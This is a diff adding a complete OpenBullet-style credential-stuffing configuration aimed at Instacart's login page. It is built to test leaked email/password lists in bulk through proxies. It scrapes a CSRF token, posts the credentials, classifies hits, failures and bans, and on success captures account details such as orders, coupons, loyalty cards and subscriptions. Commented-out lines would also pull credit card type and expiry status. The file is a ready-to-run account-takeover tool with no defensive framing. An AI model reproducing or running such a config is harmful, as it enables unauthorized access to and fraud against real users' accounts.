@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Instacart",
+  "SuggestedBots": 100,
+  "LastModified": "2018-08-11T10:16:22.7474522+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.instacart.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "csrf-token\" content=\"" "\"" Recursive=FALSE -> VAR "TOK" "" "" 
+REQUEST POST "https://www.instacart.com/accounts/login" AutoRedirect=TRUE 
+  CONTENT "user%5Bemail%5D=<USER>&user%5Bpassword%5D=<PASS>&authenticity_token=<TOK>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ":scheme: https" 
+  HEADER ":path: /accounts/login" 
+  HEADER ":method: POST" 
+  HEADER ":authority: www.instacart.com" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "origin: https://www.instacart.com" 
+  HEADER "referer: https://www.instacart.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "active\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Email or password" 
+    KEY "Invalid email or password" 
+    KEY "Your password has expired" 
+  KEYCHAIN Ban OR 
+    KEY "Very sorry." 
+    KEY "Sorry." 
+PARSE "<SOURCE>" LR ",\"vip\":" "," Recursive=FALSE -> CAP "VIP" "" "" 
+PARSE "<SOURCE>" LR "orders_count\":" "," Recursive=FALSE -> CAP "Orders" "" "" 
+PARSE "<SOURCE>" LR "is_express_member\":" "," Recursive=FALSE -> CAP "Express" "" "" 
+PARSE "<SOURCE>" LR "coupons\":[" "]" Recursive=FALSE -> CAP "Coupons" "" "" 
+PARSE "<SOURCE>" LR "delivery_coupons\":[" "]" Recursive=FALSE -> CAP "Delivery Coupons" "" "" 
+#PARSE_CC PARSE "<SOURCE>" LR "credit_card_type\":\"" "\"," Recursive=FALSE -> CAP "Credit Cards" "" "" 
+#PARSE_CC_STATUS PARSE "<SOURCE>" LR "expired?\":" "," Recursive=FALSE -> CAP "EXPIRED?" "" "" 
+PARSE "<SOURCE>" LR "loyalty_cards\":[" "]" Recursive=FALSE -> CAP "Loyalty Cards" "" "" 
+PARSE "<SOURCE>" LR "\"subscriptions\":[" "]" Recursive=FALSE -> CAP "Subscriptions" "" "" 
+PARSE "<SOURCE>" LR "earned_summary\":\"" "\"" Recursive=FALSE -> CAP "Invite Rewards" "" "" 
